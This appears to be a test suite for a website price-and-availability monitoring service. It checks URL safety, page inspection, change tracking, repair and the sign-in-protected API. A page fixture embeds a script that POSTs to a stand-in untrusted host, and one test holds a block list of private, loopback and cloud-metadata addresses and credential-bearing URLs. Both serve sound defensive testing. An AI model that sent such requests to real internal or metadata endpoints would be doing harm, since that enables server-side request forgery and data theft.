import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { publicAddress, publicUrl, readPublicPage } from '../src/websites/public-read.js';
import { inspectPage, extract } from '../src/websites/inspect.js';
import { Websites } from '../src/websites/service.js';
import { startRuntime } from '../src/server.js';

const url = 'https://shop.example/product';
const page = (price = '£10.00', selector = 'price_color') => ({
  url,
  contentType: 'text/html',
  body: `<html><h1>A useful book</h1><p class="${selector}">${price}</p><p class="availability">In stock</p><a href="/api/product.json">Data</a><script>fetch('https://untrusted.invalid/write',{method:'POST'})</script></html>`,
});
test('Public transport rejects private, loopback, mapped, reserved and credential-bearing destinations', async () => {
  for (const ip of [
    '127.0.0.1',
    '10.1.2.3',
    '172.16.0.1',
    '192.168.1.1',
    '169.254.169.254',
    '100.64.0.1',
    '0.0.0.0',
    '224.0.0.1',
    '::1',
    'fc00::1',
    'fe80::1',
    '::ffff:127.0.0.1',
    '192.0.2.1',
  ])
    assert.equal(publicAddress(ip), false, ip);
  assert.equal(publicAddress('8.8.8.8'), true);
  for (const target of [
    'http://shop.example',
    'https://localhost',
    'https://intranet.local',
    'https://name:secret@shop.example',
    'https://shop.example:8443',
    'https://shop.example/?api_key=secret',
  ])
    assert.throws(() => publicUrl(target));
  await assert.rejects(readPublicPage('https://127.0.0.1/'), /private or reserved/);
});
test('Inspection derives source-backed fields and refuses ambiguous selectors', () => {
  const inspection = inspectPage(page());
  assert.deepEqual(
    inspection.fields.map((f) => f.key),
    ['title', 'price', 'availability'],
  );
  assert.equal(inspection.fields.find((f) => f.key === 'price')?.sample, '£10.00');
  assert.deepEqual(inspection.links, ['https://shop.example/api/product.json']);
  const ambiguous = inspectPage({
    ...page(),
    body: '<h1>Catalog</h1><p class="price">10</p><p class="price">20</p>',
  });
  assert.equal(
    ambiguous.fields.some((f) => f.key === 'price'),
    false,
  );
  assert.throws(
    () =>
      extract(
        { ...page(), url: 'https://other.example/product' },
        inspection.fields,
        new URL(url).origin,
      ),
    /outside/,
  );
});
test('Structured product metadata and public JSON produce actual values without running page code', () => {
  const structured = inspectPage({
    ...page(),
    body: '<script type="application/ld+json">{"@type":"Product","name":"Widget","offers":{"price":12,"priceCurrency":"INR","availability":"https://schema.org/InStock"}}</script>',
  });
  assert.equal(structured.fields.find((f) => f.key === 'price')?.sample, '12');
  const json = inspectPage({
    url,
    contentType: 'application/json',
    body: '{"price":0,"available":false,"api_key":"hidden","items":[1,2]}',
  });
  assert.deepEqual(
    json.fields.map((f) => f.sample),
    ['0', 'false'],
  );
});
test('Website lifecycle detects values, withholds broken data, verifies repair, pauses and persists independently', async () => {
  let current = page(),
    reads = 0;
  const dir = await mkdtemp(join(tmpdir(), 'ghostapi-websites-'));
  const websites = new Websites(dir, async () => {
    reads++;
    return current;
  });
  await websites.load();
  const id = await websites.inspect({ url, name: 'Book', task: 'Track price and availability' });
  await websites.idle();
  const inspection = websites.snapshot()[0]!.inspection!;
  await websites.approve(id, {
    inspection_hash: inspection.sha256,
    fields: ['title', 'price', 'availability'],
    interval_minutes: 15,
  });
  await websites.idle();
  assert.equal(websites.data(id).data.price, '£10.00');
  current = page('£12.00');
  await websites.check(id);
  await websites.idle();
  assert.equal(websites.snapshot()[0]!.status, 'changed');
  assert.equal(websites.snapshot()[0]!.history[0]!.changes![0]!.before, '£10.00');
  current = page('£12.00', 'product-price');
  await websites.check(id);
  await websites.idle();
  assert.equal(websites.snapshot()[0]!.status, 'broken');
  assert.throws(() => websites.data(id), /withheld/);
  assert.deepEqual(websites.snapshot()[0]!.repair?.changed, ['price']);
  current = { ...page(), body: '<h1>A useful book</h1>' };
  await websites.applyRepair(id, 1);
  await websites.idle();
  assert.equal(
    websites.snapshot()[0]!.contract!.version,
    1,
    'Failed fresh verification must preserve the active contract',
  );
  current = page('£12.00', 'product-price');
  await websites.applyRepair(id, 1);
  await websites.idle();
  assert.equal(websites.data(id).contract_version, 2);
  await assert.rejects(websites.applyRepair(id, 1), /stale/);
  await websites.toggle(id, false);
  const count = reads;
  await websites.tick(Date.now() + 86400000);
  await websites.idle();
  assert.equal(reads, count, 'Paused monitoring cannot fetch');
  await websites.toggle(id, true);
  await websites.tick();
  await websites.idle();
  assert.equal(reads, count + 1);
  await websites.close();
  const restored = new Websites(dir, async () => current);
  await restored.load();
  assert.equal(restored.data(id).contract_version, 2);
  await restored.archive(id);
  assert.equal(restored.snapshot().length, 0);
  assert.throws(() => restored.data(id), /not found/);
  await restored.close();
});
test('Website API requires sign-in and returns 202 for inspection and a contract-bound JSON result', async (t) => {
  const runtime = await startRuntime({
    dashboardPort: 0,
    portalPort: 0,
    dataDir: await mkdtemp(join(tmpdir(), 'ghostapi-web-api-')),
    adminPassword: 'website-test-password-fixture',
    websiteReader: async () => page(),
  });
  t.after(() => runtime.close());
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    'X-GhostAPI-Client': 'dashboard',
  };
  assert.equal(
    (await fetch(`${runtime.url}/api/websites`, { method: 'POST', headers, body: '{}' })).status,
    401,
  );
  const login = await fetch(`${runtime.url}/api/login`, {
    method: 'POST',
    headers,
    body: JSON.stringify({ password: 'website-test-password-fixture' }),
  });
  headers.Cookie = login.headers.get('set-cookie')!.split(';')[0]!;
  const created = await fetch(`${runtime.url}/api/websites`, {
    method: 'POST',
    headers,
    body: JSON.stringify({ action: 'inspect', url }),
  });
  assert.equal(created.status, 202);
  const { id } = await created.json();
  await runtime.websites.idle();
  const website = runtime.websites.snapshot()[0]!;
  const approved = await fetch(`${runtime.url}/api/websites`, {
    method: 'POST',
    headers,
    body: JSON.stringify({
      action: 'approve',
      id,
      fields: ['title', 'price'],
      inspection_hash: website.inspection!.sha256,
      interval_minutes: 60,
    }),
  });
  assert.equal(approved.status, 202);
  await runtime.websites.idle();
  assert.equal(
    (await (await fetch(`${runtime.url}/api/websites/${id}/data`, { headers })).json()).data.price,
    '£10.00',
  );
  await runtime.service.reset();
  assert.equal(
    runtime.websites.snapshot().length,
    1,
    'Resetting the supplier demo preserves enrolled websites',
  );
});
